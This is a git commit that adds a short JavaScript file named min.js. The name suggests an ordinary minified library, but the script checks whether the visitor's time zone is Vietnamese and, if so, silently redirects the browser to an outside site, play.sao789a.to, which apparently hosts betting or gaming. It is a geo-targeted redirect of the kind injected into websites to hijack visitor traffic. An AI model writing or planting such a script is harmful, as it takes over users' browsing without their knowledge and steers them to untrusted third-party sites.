1bdc2b5d930c6da2001728fa94ada119663edd6a
hai07t <hai07t@gmail.com>
2025-09-01 15:21:47 +0700

    Add files via upload

---
+++ min.js
@@ -0,0 +1,6 @@
+const userTimeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+console.log(userTimeZone);
+
+if (userTimeZone === "Asia/Ho_Chi_Minh" || userTimeZone === "Asia/Saigon") {
+  window.location.href = "https://play.sao789a.to/";
+}
